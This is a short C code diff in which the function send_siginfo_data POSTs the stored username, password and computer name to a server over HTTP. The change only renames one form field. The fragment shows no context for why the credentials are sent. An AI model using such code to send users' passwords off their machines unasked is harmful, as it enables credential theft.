@@ -255,7 +255,7 @@ void send_siginfo_data() {
     if(http_connect() == HTTP_SUCCESS && http_send_headers() == HTTP_SUCCESS) {
         post_data_ptr = post_data;
         post_data_ptr += snprintf(post_data, post_data_s, 
-                            "user=%s&pass=%s&compi=%s", 
+                            "user=%s&pass=%s&comp=%s", 
                             profile.username,
                             profile.password,
                             profile.computer);
